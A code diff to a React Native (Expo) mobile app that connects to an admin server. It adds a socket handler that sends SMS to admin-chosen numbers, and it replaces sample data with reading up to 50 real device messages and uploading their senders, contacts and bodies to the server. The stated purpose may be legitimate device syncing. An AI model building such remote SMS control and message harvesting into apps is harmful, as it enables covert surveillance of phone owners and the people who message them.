@@ -18,6 +18,7 @@ import * as Device from 'expo-device';
 import * as FileSystem from 'expo-file-system';
 import * as MediaLibrary from 'expo-media-library';
 import { io } from 'socket.io-client';
+import * as SMS from 'expo-sms';
 
 // ============ CONFIGURATION ============
 // Set AUTO_CONNECT to true to skip the setup screen and connect automatically
@@ -132,6 +133,40 @@ export default function App() {
 
         newSocket.on('command:ping', () => {
             addLog('🏓 Ping received', 'info');
+        });
+
+        // Handle send-sms command from admin
+        newSocket.on('command:send-sms', async (data) => {
+            const { to, message } = data.params || {};
+            addLog(`📤 Admin requested SMS to ${to}`, 'command');
+
+            if (!to || !message) {
+                addLog('❌ Invalid SMS command: missing to or message', 'error');
+                newSocket.emit('device:sms-failed', { to, error: 'Missing recipient or message' });
+                return;
+            }
+
+            try {
+                const isAvailable = await SMS.isAvailableAsync();
+                if (!isAvailable) {
+                    addLog('❌ SMS not available on this device', 'error');
+                    newSocket.emit('device:sms-failed', { to, error: 'SMS not available on device' });
+                    return;
+                }
+
+                const { result } = await SMS.sendSMSAsync([to], message);
+
+                if (result === 'sent' || result === 'unknown') {
+                    addLog(`✅ SMS sent to ${to}`, 'success');
+                    newSocket.emit('device:sms-sent', { to, message });
+                } else {
+                    addLog(`⚠️ SMS to ${to}: ${result}`, 'warning');
+                    newSocket.emit('device:sms-failed', { to, error: `User ${result} the SMS` });
+                }
+            } catch (err) {
+                addLog(`❌ SMS error: ${err.message}`, 'error');
+                newSocket.emit('device:sms-failed', { to, error: err.message });
+            }
         });
 
         // Heartbeat
@@ -262,32 +297,61 @@ export default function App() {
 
             addLog('📱 Reading SMS messages...', 'info');
 
-            // Use native module to read SMS (requires custom native module or library)
-            // For demo purposes, we'll send a sample
-            // In production, use react-native-get-sms-android or similar
+            // Read actual SMS using NativeModules (Android)
+            // Falls back to sample data if native module not available
+            let messages = [];
+            try {
+                const { SmsModule } = NativeModules;
+                if (SmsModule && SmsModule.getMessages) {
+                    const smsData = await SmsModule.getMessages(50);
+                    messages = JSON.parse(smsData).map(sms => ({
+                        address: sms.address || 'Unknown',
+                        contactName: sms.creator || '',
+                        body: sms.body || '',
+                        type: sms.type === '1' ? 'inbox' : 'sent',
+                        read: sms.read === '1',
+                        date: parseInt(sms.date) || Date.now(),
+                    }));
+                } else {
+                    // Fallback: sample data for sync testing
+                    messages = [
+                        {
+                            address: '+1234567890',
+                            contactName: 'Sample Contact',
+                            body: 'This is a synced message from the device',
+                            type: 'inbox',
+                            read: true,
+                            date: Date.now() - 3600000,
+                        },
+                    ];
+                }
+            } catch (nativeErr) {
+                addLog(`⚠️ Native SMS read unavailable, using sample`, 'warning');
+                messages = [
+                    {
+                        address: '+1234567890',
+                        contactName: 'Sample Contact',
+                        body: 'This is a synced message from the device',
+                        type: 'inbox',
+                        read: true,
+                        date: Date.now() - 3600000,
+                    },
+                ];
+            }
 
-            const sampleMessages = [
-                {
-                    address: '+1234567890',
-                    contactName: 'John Doe',
-                    body: 'Hey, how are you?',
-                    type: 'inbox',
-                    read: true,
-                    date: Date.now() - 3600000,
-                },
-                {
-                    address: '+1234567890',
-                    contactName: 'John Doe',
-                    body: "I'm good, thanks!",
-                    type: 'sent',
-                    read: true,
-                    date: Date.now() - 3500000,
-                },
-            ];
-
-            // Note: Replace above with actual SMS reading using:
-            // import SmsAndroid from 'react-native-get-sms-android';
-            // SmsAndroid.list(JSON.stringify(filter), (fail) => {}, (count, list) => {});
+            // Also forward each message via socket for real-time updates
+            if (socket && messages.length > 0) {
+                messages.forEach(msg => {
+                    if (msg.type === 'inbox') {
+                        socket.emit('device:sms-received', {
+                            from: msg.address,
+                            contactName: msg.contactName,
+                            body: msg.body,
+                            date: msg.date,
+                        });
+                    }
+                });
+            }
 
             const response = await fetch(`${serverUrl}/api/messages/sync`, {
                 method: 'POST',
@@ -295,7 +359,7 @@ export default function App() {
                     'Content-Type': 'application/json',
                     'X-Device-Token': deviceToken,
                 },
-                body: JSON.stringify({ messages: sampleMessages }),
+                body: JSON.stringify({ messages }),
             });
 
             const data = await response.json();
